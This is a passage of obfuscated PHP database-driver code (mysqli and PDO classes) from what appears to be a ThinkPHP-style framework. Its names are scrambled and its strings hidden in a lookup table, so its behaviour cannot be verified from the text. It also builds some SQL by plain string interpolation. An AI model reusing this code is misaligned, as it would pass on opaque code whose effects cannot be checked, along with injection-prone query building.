mysql_data_seek($this->queryID, 0); } return $àĞÂ¼Ù; } public function getFields($À•Ø›¦ç) { $±£şÑàŸ =& $_SERVER[Ó¡Ÿ§‚]; $¼‹©Ú¥¸ = $this->query($±£şÑàŸ[896] . $this->parseKey($À•Ø›¦ç)); $ïÙ±Å¶Ü = array(); if ($¼‹©Ú¥¸) { foreach ($¼‹©Ú¥¸ as $Ã‚ûúà± => $­üÄ¢Ä) { $ïÙ±Å¶Ü[$­üÄ¢Ä[$±£şÑàŸ[31]]] = array($±£şÑàŸ[32] => $­üÄ¢Ä[$±£şÑàŸ[31]], $±£şÑàŸ[33] => $­üÄ¢Ä[$±£şÑàŸ[34]], $±£şÑàŸ[35] => (bool) (strtoupper($­üÄ¢Ä[$±£şÑàŸ[36]]) === $±£şÑàŸ[897]), $±£şÑàŸ[37] => $­üÄ¢Ä[$±£şÑàŸ[38]], $±£şÑàŸ[39] => strtolower($­üÄ¢Ä[$±£şÑàŸ[40]]) == $±£şÑàŸ[41], $±£şÑàŸ[42] => strtolower($­üÄ¢Ä[$±£şÑàŸ[43]]) == $±£şÑàŸ[44]); } } return $ïÙ±Å¶Ü; } public function getTables($Àµ‹¸¤€ = '') { $Ãé§»Ì =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($Àµ‹¸¤€)) { $º‘€’”ñ = $Ãé§»Ì[898] . $Àµ‹¸¤€ . $Ãé§»Ì[899]; } else { $º‘€’”ñ = $Ãé§»Ì[900]; } $Ú³‚•Ç = $this->query($º‘€’”ñ); $¯ïí—æÖ = array(); foreach ($Ú³‚•Ç as $½ó®İ‡æ => $â‡ä¶ƒ±) { $¯ïí—æÖ[$½ó®İ‡æ] = current($â‡ä¶ƒ±); } return $¯ïí—æÖ; } public function replace($´Æ©±ßË, $£®³šê = array()) { $Áè¸ñ˜Ó =& $_SERVER[Ó¡Ÿ§‚]; foreach ($´Æ©±ßË as $õ¬™é¸ => $ÒûÍµ»…) { $ôÏÄ ´ = $this->parseValue($ÒûÍµ»…); if (is_scalar($ôÏÄ ´)) { $‘‡úğ[] = $ôÏÄ ´; $ãÕŠ¾Ü[] = $this->parseKey($õ¬™é¸); } } $şÀ¬ìó = $Áè¸ñ˜Ó[901] . $this->parseTable($£®³šê[$Áè¸ñ˜Ó[279]]) . $Áè¸ñ˜Ó[902] . implode($Áè¸ñ˜Ó[50], $ãÕŠ¾Ü) . $Áè¸ñ˜Ó[903] . implode($Áè¸ñ˜Ó[50], $‘‡úğ) . $Áè¸ñ˜Ó[904]; return $this->execute($şÀ¬ìó); } public function insertAll($²®ìµ°Î, $–¸èá‰Š = array(), $á¬ô»ûâ = false) { $±ÂëíÈ =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($²®ìµ°Î[0])) { return !1; } $ê¥°ùœÙ = array_keys($²®ìµ°Î[0]); $¾æ¢ÅÁä = array(); foreach ($²®ìµ°Î as $§Í”“”) { $­ŸŒ÷š“ = array(); foreach ($§Í”“” as $ü ©ŸØ½ => $ÚÔ—æ—) { $ÚÔ—æ— = $this->parseValue($ÚÔ—æ—); if (is_scalar($ÚÔ—æ—)) { $­ŸŒ÷š“[] = $ÚÔ—æ—; } } $¾æ¢ÅÁä[] = $±ÂëíÈ[260] . implode($±ÂëíÈ[50], $­ŸŒ÷š“) . $±ÂëíÈ[904]; } array_walk($ê¥°ùœÙ, array($this, $±ÂëíÈ[905])); $ê²´ØÕø = ($á¬ô»ûâ ? $±ÂëíÈ[906] : $±ÂëíÈ[907]) . $±ÂëíÈ[908] . $this->parseTable($–¸èá‰Š[$±ÂëíÈ[279]]) . $±ÂëíÈ[902] . implode($±ÂëíÈ[50], $ê¥°ùœÙ) . $±ÂëíÈ[909] . implode($±ÂëíÈ[50], $¾æ¢ÅÁä); return $this->execute($ê²´ØÕø); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ó‘Ëñé® =& $_SERVER[Ó¡Ÿ§‚]; $this->error = mysql_errno() . $Ó‘Ëñé®[4] . mysql_error($this->_linkID); if ($Ó‘Ëñé®[12] != $this->queryStr) { $this->error .= LNG($Ó‘Ëñé®[48]) . $this->queryStr; } think_trace($this->error, $Ó‘Ëñé®[12], $Ó‘Ëñé®[49]); return $this->error; } public function escapeString($Ò¼ï±Î) { if ($this->_linkID) { return mysql_real_escape_string($Ò¼ï±Î, $this->_linkID); } else { return mysql_escape_string($Ò¼ï±Î); } } public function parseKey(&$©á«ÇŒ, $é×çĞì = true) { $ÖÖ•Õ‡½ =& $_SERVER[Ó¡Ÿ§‚]; if ($é×çĞì) { $©á«ÇŒ = $this->parseKeyCheck($©á«ÇŒ); } if ($©á«ÇŒ != $ÖÖ•Õ‡½[189] && !preg_match($ÖÖ•Õ‡½[910], $©á«ÇŒ)) { $©á«ÇŒ = $ÖÖ•Õ‡½[385] . trim($©á«ÇŒ, $ÖÖ•Õ‡½[385]) . $ÖÖ•Õ‡½[385]; } return $©á«ÇŒ; } } class DbMysqli extends Db { public function __construct($Ë¦µ‚éá = '') { $Ì˜ì÷š´ =& $_SERVER[Ó¡Ÿ§‚]; if (!extension_loaded($Ì˜ì÷š´[911])) { think_exception(think_lang($Ì˜ì÷š´[14]) . $Ì˜ì÷š´[912]); } if (!empty($Ë¦µ‚éá)) { $this->config = $Ë¦µ‚éá; if (empty($this->config[$Ì˜ì÷š´[17]])) { $this->config[$Ì˜ì÷š´[17]] = $Ì˜ì÷š´[12]; } } } public function connect($·—ÊŠŠÄ = '', $ã¸€Ë¨Ø = 0) { $Àˆ«‰”­ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->linkID[$ã¸€Ë¨Ø])) { if (empty($·—ÊŠŠÄ)) { $·—ÊŠŠÄ = $this->config; } $this->linkID[$ã¸€Ë¨Ø] = new mysqli($·—ÊŠŠÄ[$Àˆ«‰”­[885]], $·—ÊŠŠÄ[$Àˆ«‰”­[887]], $·—ÊŠŠÄ[$Àˆ«‰”­[888]], $·—ÊŠŠÄ[$Àˆ«‰”­[21]], $·—ÊŠŠÄ[$Àˆ«‰”­[886]] ? intval($·—ÊŠŠÄ[$Àˆ«‰”­[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $…®òÓ = $this->linkID[$ã¸€Ë¨Ø]->server_version; $this->linkID[$ã¸€Ë¨Ø]->query($Àˆ«‰”­[889] . think_config($Àˆ«‰”­[890]) . $Àˆ«‰”­[58]); if ($…®òÓ > $Àˆ«‰”­[891]) { $this->linkID[$ã¸€Ë¨Ø]->query($Àˆ«‰”­[892]); } $this->connected = !0; if (1 != think_config($Àˆ«‰”­[22])) { unset($this->config); } } return $this->linkID[$ã¸€Ë¨Ø]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¬Á²àÊ¿) { $³ô–áš‚ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¬Á²àÊ¿; if ($this->queryID) { $this->free(); } think_action_status($³ô–áš‚[23], 1); think_status($³ô–áš‚[24]); $this->queryID = $this->_linkID->query($¬Á²àÊ¿); if ($this->_linkID->more_results()) { while (($‹ÃıÂ‡ = $this->_linkID->next_result()) != NULL) { $‹ÃıÂ‡->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¹ÄèË’) { $©¹Ê ÜĞ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹ÄèË’; if ($this->queryID) { $this->free(); } think_action_status($©¹Ê ÜĞ[25], 1); think_status($©¹Ê ÜĞ[24]); $î¦øÃÓµ = $this->_linkID->query($¹ÄèË’); $this->debug(); if (!1 === $î¦øÃÓµ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $é“•—Ì = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$é“•—Ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ıÍÂÚûÇ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ıÍÂÚûÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÈğƒÖ¿ = array(); if ($this->numRows > 0) { for ($â¶¡ó”ã = 0; $â¶¡ó”ã < $this->numRows; $â¶¡ó”ã++) { $ÈğƒÖ¿[$â¶¡ó”ã] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÈğƒÖ¿; } public function getFields($„§”˜Æ³) { $©õŸáÏÎ =& $_SERVER[Ó¡Ÿ§‚]; $À§šï˜‘ = $this->query($©õŸáÏÎ[896] . $this->parseKey($„§”˜Æ³)); $¤€şÓ• = array(); if ($À§šï˜‘) { foreach ($À§šï˜‘ as $›ûŒòƒş => $Á®¿áí©) { $¤€şÓ•[$Á®¿áí©[$©õŸáÏÎ[31]]] = array($©õŸáÏÎ[32] => $Á®¿áí©[$©õŸáÏÎ[31]], $©õŸáÏÎ[33] => $Á®¿áí©[$©õŸáÏÎ[34]], $©õŸáÏÎ[35] => (bool) ($Á®¿áí©[$©õŸáÏÎ[36]] === $©õŸáÏÎ[12]), $©õŸáÏÎ[37] => $Á®¿áí©[$©õŸáÏÎ[38]], $©õŸáÏÎ[39] => strtolower($Á®¿áí©[$©õŸáÏÎ[40]]) == $©õŸáÏÎ[41], $©õŸáÏÎ[42] => strtolower($Á®¿áí©[$©õŸáÏÎ[43]]) == $©õŸáÏÎ[44]); } } return $¤€şÓ•; } public function getTables($Õê¶ÌÃ = '') { $•¢ï¾¼¾ =& $_SERVER[Ó¡Ÿ§‚]; $€Ç¨Œ²Ú = !empty($Õê¶ÌÃ) ? $•¢ï¾¼¾[898] . $Õê¶ÌÃ . $•¢ï¾¼¾[899] : $•¢ï¾¼¾[900]; $ÊåøÀÈÕ = $this->query($€Ç¨Œ²Ú); $èøñà¡× = array(); if ($ÊåøÀÈÕ) { foreach ($ÊåøÀÈÕ as $œÃ¶½‹¶ => $Ó¢«¦¢ø) { $èøñà¡×[$œÃ¶½‹¶] = current($Ó¢«¦¢ø); } } return $èøñà¡×; } public function replace($¡ÂºëäÉ, $é––Á·Ë = array()) { $ğ§˜Ì¡• =& $_SERVER[Ó¡Ÿ§‚]; foreach ($¡ÂºëäÉ as $Ø®–±§ˆ => $Â ÖÄĞÔ) { $õ’»¯‘Ñ = $this->parseValue($Â ÖÄĞÔ); if (is_scalar($õ’»¯‘Ñ)) { $Ôæ—±»[] = $õ’»¯‘Ñ; $ûÜƒÆÅ—[] = $this->parseKey($Ø®–±§ˆ); } } $ì¨ëãÀ¤ = $ğ§˜Ì¡•[901] . $this->parseTable($é––Á·Ë[$ğ§˜Ì¡•[279]]) . $ğ§˜Ì¡•[902] . implode($ğ§˜Ì¡•[50], $ûÜƒÆÅ—) . $ğ§˜Ì¡•[903] . implode($ğ§˜Ì¡•[50], $Ôæ—±») . $ğ§˜Ì¡•[904]; return $this->execute($ì¨ëãÀ¤); } public function insertAll($ñ„ƒŸÏœ, $ôšé¢Ø = array(), $‹ÇÔîÎ¥ = false) { $½£É»“Ä =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($ñ„ƒŸÏœ[0])) { return !1; } $…øÀı = array_keys($ñ„ƒŸÏœ[0]); $¦¼İŠ¯Ì = array(); foreach ($ñ„ƒŸÏœ as $×¬¦â˜é) { $ö¢À½¯ë = array(); foreach ($×¬¦â˜é as $ÒÜ‹æÇè => $†¿ùÆÆŞ) { $†¿ùÆÆŞ = $this->parseValue($†¿ùÆÆŞ); if (is_scalar($†¿ùÆÆŞ)) { $ö¢À½¯ë[] = $†¿ùÆÆŞ; } } $¦¼İŠ¯Ì[] = $½£É»“Ä[260] . implode($½£É»“Ä[50], $ö¢À½¯ë) . $½£É»“Ä[904]; } array_walk($…øÀı, array($this, $½£É»“Ä[905])); $ùÖÉ¼¡Õ = $‹ÇÔîÎ¥ ? $½£É»“Ä[906] : $½£É»“Ä[907]; $¸ñš ƒâ = $ùÖÉ¼¡Õ . $½£É»“Ä[908] . $this->parseTable($ôšé¢Ø[$½£É»“Ä[279]]) . $½£É»“Ä[902] . implode($½£É»“Ä[50], $…øÀı) . $½£É»“Ä[909] . implode($½£É»“Ä[50], $¦¼İŠ¯Ì); return $this->execute($¸ñš ƒâ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÀÛ²šÂØ =& $_SERVER[Ó¡Ÿ§‚]; $this->error = $this->_linkID->errno . $ÀÛ²šÂØ[4] . $this->_linkID->error; if ($ÀÛ²šÂØ[12] != $this->queryStr) { $this->error .= LNG($ÀÛ²šÂØ[48]) . $this->queryStr; } think_trace($this->error, $ÀÛ²šÂØ[12], $ÀÛ²šÂØ[49]); return $this->error; } public function escapeString($Ä¯®¶ñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ä¯®¶ñ); } else { return addslashes($Ä¯®¶ñ); } } public function parseKey(&$ºÜ«Ş»§, $Ÿ©÷Ä¤Ì = true) { $¥‰ñáûÕ =& $_SERVER[Ó¡Ÿ§‚]; if ($Ÿ©÷Ä¤Ì) { $ºÜ«Ş»§ = $this->parseKeyCheck($ºÜ«Ş»§); } if ($ºÜ«Ş»§ != $¥‰ñáûÕ[189] && !preg_match($¥‰ñáûÕ[910], $ºÜ«Ş»§)) { $ºÜ«Ş»§ = $¥‰ñáûÕ[385] . trim($ºÜ«Ş»§, $¥‰ñáûÕ[385]) . $¥‰ñáûÕ[385]; } return $ºÜ«Ş»§; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($†ŞÑ¶“ = '') { $ÆÉå—×§ =& $_SERVER[Ó¡Ÿ§‚]; if (!class_exists($ÆÉå—×§[913])) { think_exception(think_lang($ÆÉå—×§[14]) . $ÆÉå—×§[914]); } if (!empty($†ŞÑ¶“)) { $this->config = $†ŞÑ¶“; if (empty($this->config[$ÆÉå—×§[17]])) { $this->config[$ÆÉå—×§[17]] = array(); } } } public function connect($†³ÑîğÕ = '', $Î·ışÀ = 0) { $ö£Ãª€Û =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->linkID[$Î·ışÀ])) { if (empty($†³ÑîğÕ)) { $†³ÑîğÕ = $this->config; } $Â…Ôè½² = !empty($†³ÑîğÕ[$ö£Ãª€Û[17]][$ö£Ãª€Û[18]]) ? $†³ÑîğÕ[$ö£Ãª€Û[17]][$ö£Ãª€Û[18]] : $this->pconnect; if ($Â…Ôè½²) { $†³ÑîğÕ[$ö£Ãª€Û[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Î·ışÀ] = new PDO($†³ÑîğÕ[$ö£Ãª€Û[915]], $†³ÑîğÕ[$ö£Ãª€Û[887]], $†³ÑîğÕ[$ö£Ãª€Û[888]], $†³ÑîğÕ[$ö£Ãª€Û[17]]); } catch (PDOException $‰¡µı¤ş) { think_exception($‰¡µı¤ş->getMessage()); } $this->dbType = $this->_getDsnType($†³ÑîğÕ[$ö£Ãª€Û[915]]); if (in_array($this->dbType, array($ö£Ãª€Û[916], $ö£Ãª€Û[917], $ö£Ãª€Û[918], $ö£Ãª€Û[919]))) { think_exception($ö£Ãª€Û[920] . $this->dbType . $ö£Ãª€Û[921] . $this->dbType . $ö£Ãª€Û[922]); } if (!$this->linkID[$Î·ışÀ]) { think_exception($ö£Ãª€Û[923]); } try { $this->linkID[$Î·ışÀ]->exec($ö£Ãª€Û[924] . think_config($ö£Ãª€Û[890])); } catch (Exception $‰¡µı¤ş) { } $this->connected = !0; if (1 != think_config($ö£Ãª€Û[22])) { unset($this->config); } } return $this->linkID[$Î·ışÀ]; } public function free() { $this->PDOStatement = null; } public function query($šÀ ºÉ‚, $¢ÀÄ‹Şé = array()) { $½âì¿“’ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šÀ ºÉ‚; if (!empty($¢ÀÄ‹Şé)) { $this->queryStr .= $½âì¿“’[925] . print_r($¢ÀÄ‹Şé, !0) . $½âì¿“’[926]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($½âì¿“’[23], 1); think_status($½âì¿“’[24]); $this->PDOStatement = $this->_linkID->prepare($šÀ ºÉ‚); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ôë±“ŞÈ = $this->PDOStatement->execute($¢ÀÄ‹Şé); $this->debug(); if (!1 === $Ôë±“ŞÈ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($é²›©’İ, $äƒ…ÓË‰ = array()) { $Í‰ÃÂ‚ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $é²›©’İ; if (!empty($äƒ…ÓË‰)) { $this->queryStr .= $Í‰ÃÂ‚[925] . print_r($äƒ…ÓË‰, !0) . $Í‰ÃÂ‚[926]; } $¡¿€û×ø = !1; if ($this->dbType == $Í‰ÃÂ‚[919]) { if (preg_match($Í‰ÃÂ‚[927], $this->queryStr, $ÕõŠŞÀ¬)) { $this->table = think_config($Í‰ÃÂ‚[928]) . str_ireplace(think_config($Í‰ÃÂ‚[929]), $Í‰ÃÂ‚[378], $ÕõŠŞÀ¬[2]); $¡¿€û×ø = (bool) $this->query($Í‰ÃÂ‚[930] . strtoupper($this->table) . $Í‰ÃÂ‚[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Í‰ÃÂ‚[25], 1); think_status($Í‰ÃÂ‚[24]); $this->PDOStatement = $this->_linkID->prepare($é²›©’İ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $˜¬ÌÂŒ² = $this->PDOStatement->execute($äƒ…ÓË‰); $this->debug(); if (!1 === $˜¬ÌÂŒ²) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¡¿€û×ø || preg_match($Í‰ÃÂ‚[931], $é²›©’İ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€ûœÛ‘’ = $this->_linkID->commit(); $this->transTimes = 0; if (!$€ûœÛ‘’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»Ğóœ‡¡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»Ğóœ‡¡) { $this->error(); return !1; } } return !0; } private function getAll() { $Ü›íˆ¶ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ü›íˆ¶); return $Ü›íˆ¶; } public function getFields($«Âğñá¤) { $»ÒÌîÜ’ =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (think_config($»ÒÌîÜ’[932])) { $”£àÌ›¾ = str_replace($»ÒÌîÜ’[933], $«Âğñá¤, think_config($»ÒÌîÜ’[932])); } else { switch ($this->dbType) { case $»ÒÌîÜ’[916]: case $»ÒÌîÜ’[934]: $”£àÌ›¾ = "\x53\105\x4c\105\103\x54\x20\x20\x20\x63\157\x6c\x75\x6d\156\137\x6e\141\155\145\x20\141\163\x20\x27\x4e\141\x6d\145\47\54\40\x20\40\x64\x61\x74\141\x5f\x74\x79\x70\x65\x20\x61\x73\40\47\x54\171\160\x65\47\x2c\x20\x20\40\143\157\x6c\165\155\x6e\137\144\145\x66\141\165\x6c\164\40\141\x73\40\x27\x44\145\146\141\165\x6c\x74\47\54\40\40\x20\x69\x73\x5f\x6e\165\154\x6c\x61\x62\154\145\40\x61\163\40\47\x4e\x75\x6c\154\47\xa\x9\11\106\x52\x4f\x4d\11\151\x6e\146\157\x72\x6d\141\164\x69\x6f\156\137\x73\143\x68\145\155\141\56\x74\x61\142\154\x65\x73\40\101\x53\x20\164\xa\11\x9\x4a\117\x49\116\11\x69\156\x66\157\x72\x6d\x61\164\151\x6f\156\137\163\143\150\x65\155\x61\56\x63\x6f\154\x75\x6d\156\x73\x20\x41\123\40\x63\xa\11\x9\x4f\x4e\40\x20\164\56\x74\141\142\x6c\x65\137\143\x61\x74\141\154\157\147\40\75\x20\x63\56\164\x61\142\154\145\x5f\143\141\x74\141\154\x6f\x67\12\x9\11\x41\116\x44\40\164\56\164\x61\x62\154\x65\137\x73\x63\150\x65\155\x61\x20\75\40\143\x2e\164\x61\x62\x6c\x65\137\163\143\150\145\155\141\12\x9\x9\x41\x4e\104\x20\x74\56\164\141\x62\x6c\145\x5f\x6e\141\x6d\145\40\x3d\x20\143\56\x74\141\142\x6c\145\x5f\x6e\x61\x6d\x65\xa\x9\11\127\x48\x45\x52\x45\x20\40\x20\x74\56\x74\x61\x62\154\145\137\156\141\155\145\40\x3d\40\47{$«Âğñá¤}\x27"; break; case $»ÒÌîÜ’[935]: $”£àÌ›¾ = $»ÒÌîÜ’[936] . $«Âğñá¤ . $»ÒÌîÜ’[937]; break; case $»ÒÌîÜ’[917]: case $»ÒÌîÜ’[919]: $”£àÌ›¾ = $»ÒÌîÜ’[938] . $»ÒÌîÜ’[939] . $»ÒÌîÜ’[940] . strtoupper($«Âğñá¤) . $»ÒÌîÜ’[941] . strtoupper($«Âğñá¤) . $»ÒÌîÜ’[942]; break; case $»ÒÌîÜ’[943]: $”£àÌ›¾ = $»ÒÌîÜ’[944] . $«Âğñá¤ . $»ÒÌîÜ’[945]; break; case $»ÒÌîÜ’[918]: break; case $»ÒÌîÜ’[946]: default: $”£àÌ›¾ = $»ÒÌîÜ’[947] . ($this->dbType == $»ÒÌîÜ’[946] ? "\140{$«Âğñá¤}\140" : $«Âğñá¤); } } $¨…¶¾øü = $this->query($”£àÌ›¾); $ÈšËÊ½ = array(); if ($¨…¶¾øü) { foreach ($¨…¶¾øü as $„‹–ìƒõ => $ıéÕŒ¯Â) { $ıéÕŒ¯Â = array_change_key_case($ıéÕŒ¯Â); $ıéÕŒ¯Â[$»ÒÌîÜ’[32]] = isset($ıéÕŒ¯Â[$»ÒÌîÜ’[32]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[32]] : $»ÒÌîÜ’[378]; $ıéÕŒ¯Â[$»ÒÌîÜ’[33]] = isset($ıéÕŒ¯Â[$»ÒÌîÜ’[33]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[33]] : $»ÒÌîÜ’[378]; $ºâÛöô‘ = isset($ıéÕŒ¯Â[$»ÒÌîÜ’[273]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[273]] : $ıéÕŒ¯Â[$»ÒÌîÜ’[32]]; $ÈšËÊ½[$ºâÛöô‘] = array($»ÒÌîÜ’[32] => $ºâÛöô‘, $»ÒÌîÜ’[33] => $ıéÕŒ¯Â[$»ÒÌîÜ’[33]], $»ÒÌîÜ’[35] => (bool) (isset($ıéÕŒ¯Â[$»ÒÌîÜ’[103]]) && $ıéÕŒ¯Â[$»ÒÌîÜ’[103]] === $»ÒÌîÜ’[12] || isset($ıéÕŒ¯Â[$»ÒÌîÜ’[35]]) && $ıéÕŒ¯Â[$»ÒÌîÜ’[35]] === $»ÒÌîÜ’[12]), $»ÒÌîÜ’[37] => isset($ıéÕŒ¯Â[$»ÒÌîÜ’[37]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[37]] : (isset($ıéÕŒ¯Â[$»ÒÌîÜ’[56]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[56]] : $»ÒÌîÜ’[378]), $»ÒÌîÜ’[39] => isset($ıéÕŒ¯Â[$»ÒÌîÜ’[94]]) ? strtolower($ıéÕŒ¯Â[$»ÒÌîÜ’[94]]) == $»ÒÌîÜ’[41] : (isset($ıéÕŒ¯Â[$»ÒÌîÜ’[57]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[57]] : !1), $»ÒÌîÜ’[42] => isset($ıéÕŒ¯Â[$»ÒÌîÜ’[948]]) ? strtolower($ıéÕŒ¯Â[$»ÒÌîÜ’[948]]) == $»ÒÌîÜ’[44] : (isset($ıéÕŒ¯Â[$»ÒÌîÜ’[94]]) ? $ıéÕŒ¯Â[$»ÒÌîÜ’[94]] : !1)); } } return $ÈšËÊ½; } public function getTables($¸ıŠ»â‡ = '') { $ÂŠù×¦Ò =& $_SERVER[Ó¡Ÿ§‚]; if (think_config($ÂŠù×¦Ò[949])) { $ş§“Ò³ = str_replace($ÂŠù×¦Ò[950], $¸ıŠ»â‡, think_config($ÂŠù×¦Ò[949])); } else { switch ($this->dbType) { case $ÂŠù×¦Ò[917]: case $ÂŠù×¦Ò[919]: $ş§“Ò³ = $ÂŠù×¦Ò[951]; break; case $ÂŠù×¦Ò[916]: case $ÂŠù×¦Ò[934]: $ş§“Ò³ = $ÂŠù×¦Ò[952]; break; case $ÂŠù×¦Ò[943]: $ş§“Ò³ = $ÂŠù×¦Ò[953]; break; case $ÂŠù×¦Ò[918]: think_exception(think_lang($ÂŠù×¦Ò[954]) . $ÂŠù×¦Ò[955]); break; case $ÂŠù×¦Ò[935]: $ş§“Ò³ = $ÂŠù×¦Ò[45] . $ÂŠù×¦Ò[46] . $ÂŠù×¦Ò[47]; break; case $ÂŠù×¦Ò[946]: default: if (!empty($¸ıŠ»â‡)) { $ş§“Ò³ = $ÂŠù×¦Ò[898] . $¸ıŠ»â‡ . $ÂŠù×¦Ò[899]; } else { $ş§“Ò³ = $ÂŠù×¦Ò[900]; } } } $æ—Ó·«Å = $this->query($ş§“Ò³); $ˆÙàã‚ = array(); foreach ($æ—Ó·«Å as $Š¨®½›¾ => $¨·Ùï) { $ˆÙàã‚[$Š¨®½›¾] = current($¨·Ùï); } return $ˆÙàã‚; } protected function parseLimit($Éğò»ıÃ) { $§îêÄÊ€ =& $_SERVER[Ó¡Ÿ§‚]; $ˆ†¿—ûŸ = $§îêÄÊ€[12]; if (!empty($Éğò»ıÃ)) { switch ($this->dbType) { case $§îêÄÊ€[943]: case $§îêÄÊ€[935]: $Éğò»ıÃ = explode($§îêÄÊ€[50], $Éğò»ıÃ); if (count($Éğò»ıÃ) > 1) { $ˆ†¿—ûŸ .= $§îêÄÊ€[51] . $Éğò»ıÃ[1] . $§îêÄÊ€[52] . $Éğò»ıÃ[0] . $§îêÄÊ€[53]; } else { $ˆ†¿—ûŸ .= $§îêÄÊ€[51] . $Éğò»ıÃ[0] . $§îêÄÊ€[53]; } break; case $§îêÄÊ€[916]: case $§îêÄÊ€[934]: break; case $§îêÄÊ€[918]: break; case $§îêÄÊ€[917]: case $§îêÄÊ€[919]: break; case $§îêÄÊ€[946]: default: $ˆ†¿—ûŸ .= $§îêÄÊ€[51] . $Éğò»ıÃ . $§îêÄÊ€[53]; } } return $ˆ†¿—ûŸ; } public function parseKey(&$‡ÁÇ¯ŸŸ, $Úàé¼ôÔ = true) { $ãÛ²³æ½ =& $_SERVER[Ó¡Ÿ§‚]; if ($Úàé¼ôÔ) { $‡ÁÇ¯ŸŸ = $this->parseKeyCheck($‡ÁÇ¯ŸŸ); } if ($this->dbType == $ãÛ²³æ½[946]) { if ($‡ÁÇ¯ŸŸ != $ãÛ²³æ½[189] && !preg_match($ãÛ²³æ½[910], $‡ÁÇ¯ŸŸ)) { $‡ÁÇ¯ŸŸ = $ãÛ²³æ½[385] . trim($‡ÁÇ¯ŸŸ, $ãÛ²³æ½[385]) . $ãÛ²³æ½[385]; } return $‡ÁÇ¯ŸŸ; } else { return parent::parseKey($‡ÁÇ¯ŸŸ, $Úàé¼ôÔ); } } public function close() { $this->_linkID = null; } public function error() { $Ü‘“½Ó“ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->PDOStatement) { $‘“Ã·«Õ = $this->PDOStatement->errorInfo(); $this->error = $‘“Ã·«Õ[1] . $Ü‘“½Ó“[4] . $‘“Ã·«Õ[2]; } else { $this->error = $Ü‘“½Ó“[12]; } if ($Ü‘“½Ó“[12] != $this->queryStr) { $this->error .= LNG($Ü‘“½Ó“[48]) . $this->queryStr; } think_trace($this->error, $Ü‘“½Ó“[12], $Ü‘“½Ó“[49]); return $this->error; } public function escapeString($õ¿Şä) { $åâ‰˜—Ğ =& $_SERVER[Ó¡Ÿ§‚]; switch ($this->dbType) { case $åâ‰˜—Ğ[943]: case $åâ‰˜—Ğ[916]: case $åâ‰˜—Ğ[934]: case $åâ‰˜—Ğ[946]: return addslashes($õ¿Şä); case $åâ‰˜—Ğ[918]: case $åâ‰˜—Ğ[935]: case $åâ‰˜—Ğ[917]: case $åâ‰˜—Ğ[919]: return str_ireplace($åâ‰˜—Ğ[58], $åâ‰˜—Ğ[59], $õ¿Şä); } } protected function parseValue($ğÖí’â) { $Êì–Œô =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($ğÖí’â)) { $‰²Â°Å = strpos($ğÖí’â, $Êì–Œô[4]) === 0 && in_array($ğÖí’â, array_keys($this->bind)); $ğÖí’â = $‰²Â°Å ? $this->escapeString($ğÖí’â) : $Êì–Œô[956] . $this->escapeString($ğÖí’â) . $Êì–Œô[956]; } elseif (isset($ğÖí’â[0]) && is_string($ğÖí’â[0]) && strtolower($ğÖí’â[0]) == $Êì–Œô[297]) { $ğÖí’â = $this->escapeString($ğÖí’â[1]); } elseif (is_array($ğÖí’â)) { $ğÖí’â = array_map(array($this, $Êì–Œô[957]), $ğÖí’â); } elseif (is_bool($ğÖí’â)) { $ğÖí’â = $ğÖí’â ? 